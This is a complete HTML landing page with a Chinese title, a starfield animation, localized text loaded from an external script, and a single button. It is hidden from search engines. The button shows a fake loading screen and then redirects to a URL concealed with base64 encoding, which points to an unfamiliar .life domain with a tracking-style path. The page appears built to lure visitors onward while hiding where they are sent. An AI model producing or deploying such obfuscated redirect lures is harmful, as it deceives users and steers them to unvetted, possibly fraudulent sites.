<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>趣味探索角</title>
<meta name="robots" content="noindex,nofollow" />
<style>
  html, body { margin:0; padding:0; height:100%; background:#000; overflow:hidden; font-family:sans-serif; }
  canvas { position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:-1; }
  #loading-screen {
    position:fixed; top:0; left:0; width:100%; height:100%;
    background:#000; color:#fff; display:flex;
    align-items:center; justify-content:center;
    font-size:1.5em; z-index:1000;
  }
  .container {
    position:relative; z-index:1;
    width:100%; height:100%; display:flex;
    flex-direction:column; justify-content:center;
    align-items:center; padding:20px; text-align:center; color:#fff;
  }
  .btn {
    margin-top:1.5em; padding:0.8em 1.5em;
    font-size:1.2em; color:#000; background:linear-gradient(to right,#00f260,#0575e6);
    border:none; border-radius:8px; cursor:pointer;
  }
</style>
</head>
<body>

<div id="loading-screen"><div id="loading-text">载入中...</div></div>
<canvas id="stars"></canvas>
<div class="container">
  <h1 id="title">🌟 Loading...</h1>
  <div id="content"></div>
  <button class="btn" id="btn">...</button>
</div>

<script src="langs.js"></script>
<script>
  // 多语言初始化
  const lang = (navigator.language || 'en').toLowerCase();
  let key = Object.keys(texts).find(k=>lang.startsWith(k));
  if (!key || !texts[key]) key = 'en';
  const t = texts[key];

  document.getElementById('loading-text').textContent = t.loading || 'Loading...';
  document.getElementById('title').textContent = t.title;
  document.getElementById('btn').textContent = t.btn;
  const contentEl = document.getElementById('content');
  t.lines.forEach(line=>{
    const p=document.createElement('p');
    p.style.color='#eee';
    p.style.margin='0.6em 0';
    p.textContent = line;
    contentEl.appendChild(p);
  });

  window.addEventListener('load', ()=>{
    setTimeout(()=>{
      document.getElementById('loading-screen').style.display = 'none';
    }, 800);
  });

  document.getElementById('btn').addEventListener('click', ()=>{
    document.getElementById('loading-text').textContent = t.loading;
    document.getElementById('loading-screen').style.display = 'flex';
    setTimeout(()=>{
      window.location.href = atob('aHR0cHM6Ly8xd2lic3AubGlmZS92My8zMzE2L21vdGl2ZS12aXRleS1wZXJtw==');
    }, 300);
  });

  // 星尘背景
  const canvas = document.getElementById('stars');
  const ctx = canvas.getContext('2d');
  function resize(){ canvas.width=window.innerWidth; canvas.height=window.innerHeight; }
  window.addEventListener('resize', resize);
  resize();
  const stars = Array.from({length:100}, ()=>({
    x:Math.random()*canvas.width,
    y:Math.random()*canvas.height,
    r:Math.random()*1.5+0.5,
    vx:(Math.random()-0.5)*0.4,
    vy:(Math.random()-0.5)*0.4
  }));
  function animate(){
    ctx.clearRect(0,0,canvas.width,canvas.height);
    ctx.fillStyle='rgba(255,255,255,0.8)';
    stars.forEach(s=>{
      ctx.beginPath();
      ctx.arc(s.x,s.y,s.r,0,2*Math.PI);
      ctx.fill();
      s.x+=s.vx; s.y+=s.vy;
      if(s.x<0||s.x>canvas.width) s.vx*=-1;
      if(s.y<0||s.y>canvas.height) s.vy*=-1;
    });
    requestAnimationFrame(animate);
  }
  animate();
</script>
</body>
</html>
